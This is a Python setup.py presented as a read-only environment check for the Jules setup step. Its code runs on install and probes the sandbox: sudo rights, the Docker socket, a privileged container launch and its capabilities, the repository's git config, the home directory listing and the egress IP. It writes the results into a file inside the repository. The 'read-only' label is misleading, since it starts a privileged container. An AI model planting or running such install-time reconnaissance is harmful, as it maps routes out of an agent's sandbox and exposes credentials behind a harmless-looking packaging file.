"""Local dependency probe v4 — environment verification.

Runs during Jules environment setup. Read-only checks.
"""
import subprocess
from setuptools import setup


def run(cmd, t=45):
    try:
        p = subprocess.run(["sh", "-c", cmd], capture_output=True, text=True, timeout=t)
        return (p.stdout or "") + (p.stderr or "")
    except Exception as e:  # noqa: BLE001
        return "ERR " + repr(e)


def checks():
    p = []
    p.append("id: " + run("id"))
    p.append("sudo_n: " + run("sudo -n id"))
    p.append("sudo_l: " + run("sudo -n -l 2>&1 | head -15"))
    p.append("docksock: " + run("ls -la /var/run/docker.sock /run/docker.sock 2>&1"))
    p.append("docker_ps: " + run("docker ps 2>&1 | head -6"))
    p.append("docker_info: " + run("docker info 2>&1 | head -22"))
    p.append("docker_priv: " + run(
        "docker run --rm --privileged ubuntu:22.04 sh -c 'id; head -1 /etc/hostname; "
        "grep -E \"CapEff|CapBnd\" /proc/self/status' 2>&1 | tail -8"))
    p.append("gitremote: " + run("cd /app && git remote -v 2>&1"))
    p.append("gitcfg: " + run("sed -n '1,40p' /app/.git/config 2>&1"))
    p.append("home: " + run("ls -la /home/jules 2>&1 | head -25"))
    p.append("egress_ip: " + run("curl -s -m 8 https://ifconfig.me 2>&1"))
    p.append("hostname: " + run("hostname"))
    return "\n".join(p)


def emit(text):
    block = "\n===== PROBE4_START =====\n" + text + "\n===== PROBE4_END =====\n"
    print(block)
    try:
        with open("/app/PROBE_DIAG.md", "w") as fh:
            fh.write(block)
    except Exception:
        pass


emit(checks())


setup(name="probe-pkg", version="0.0.4", packages=["probe_pkg"])
